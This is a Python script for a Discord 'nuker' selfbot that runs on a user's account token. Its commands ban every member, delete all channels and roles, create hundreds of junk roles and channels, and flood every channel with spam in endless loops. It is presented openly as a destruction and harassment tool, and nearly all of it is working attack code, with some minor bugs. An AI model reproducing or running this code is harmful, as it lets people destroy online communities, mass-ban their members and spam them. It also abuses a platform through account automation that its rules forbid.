import discord
from discord.ext import commands
import asyncio 
import random
import os

##Bot Sup##
prefix = input("Enter A Prefix: ")
token = input("Enter Your Token: ")
spam = input("Enter A Spam Message: ")
channel = input("Enter Channel Names: ")
roles = input("Enter Role Names: ")
##Setup Finished##

client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
client.remove_command(name="help")

os.system('cls' if os.name == 'nt' else 'clear')
@client.event
async def on_ready():
    print(f'''
 ______   ______     ______     __    __     __     __   __     ______     __        
/\__  _\ /\  ___\   /\  == \   /\ "-./  \   /\ \   /\ "-.\ \   /\  __ \   /\ \       
\/_/\ \/ \ \  __\   \ \  __<   \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \  __ \  \ \ \____  
   \ \_\  \ \_____\  \ \_\ \_\  \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_\ \_\  \ \_____\ 
    \/_/   \/_____/   \/_/ /_/   \/_/  \/_/   \/_/   \/_/ \/_/   \/_/\/_/   \/_____/ 
                                                                                     
------------------------------------------------------------------ Nuker Selfbot Is Online <$
    ''')
 
@client.command()
async def destroy(ctx):
  for channel in ctx.guild.channels:
      await channel.delete()

@client.command(pass_context=True)
async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name=" ðŸŒ  Terminal Nuker")
        embed.add_field(name="{prefix}flood", value="```Spams the same message in every channel!``` ðŸ”±")
        embed.add_field(name="{prefix}spam {amount} {message}", value="```spams the message how much times you want in a single channel```ðŸ”±")
        embed.add_field(name="{prefix}destroy", value="```Deletes all the channels in the guild```ðŸ”±")
        embed.add_field(name="{prefix}roles", value="```Deletes all the roles, and makes new roles!```ðŸ”±")
        embed.add_field(name="{prefix}flood", value="```Floods the channels with pings!```ðŸ”±")
        embed.add_field(name="{prefix}nuke", value="```This will delete all channels and roles, and make new roles and channels and will spam inside every channel.```ðŸ”±")
        embed.set_image(url="")
        await ctx.send(embed=embed)


@client.command()
async def flood(ctx):
  guild = ctx.message.guild
  await ctx.message.delete()
  await ctx.send("`selfbot is now spamming!`") 
  while True:
    for channel in guild.text_channels:
      await channel.send({spam})
      
@client.command()
async def roles(ctx):
  guild = ctx.message.guild
  for role in guild.roles:
    try:
      await role.delete()
      print("Roles have been deleted")
    except:
      pass
      print("Roles could not be deleted")
  for i in range(250):
    try:
      await guild.create_role(name=roles)
      print("Role has been created")
    except:
      print("Role could not be created")	  
      pass
      
@client.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    
    print("ENTERING: Banning members")

    for member in list(ctx.message.guild.members):
       try:
           await guild.ban(member)
           print("User" +member.name + "Has Been  Banned")
       except:
           pass
    await ctx.send("`Banned all!`")

#deleting channels
    print("ENTERING: Deleting channels")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print("Channel deleted")
    except:
      pass
      print("Channel could not be deleted")
    
#creating channels

    print("ENTERING: Creating channels")

    try:
      for i in range(250):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print("Channel created")
    except:
      pass
      print("Channel could not be created")
     
    print("ENTERING: Spamming messages")

    while True:
      for channel in guild.text_channels:
        await channel.send(spam)
   
@client.command()
async def spam(ctx, amount:int=None, *, message: str=None):
    await ctx.message.delete()
    try:
        if amount is None or message is None:
            await ctx.send(f"Usage: `{ctx.prefix}spam <amount> <message>`")
        else:
            for each in range (0, amount):
                await ctx.send(f"{message}")
    except Exception as e:
        await ctx.send(f"Error: {e}")    
        		
client.run(token, bot=False)
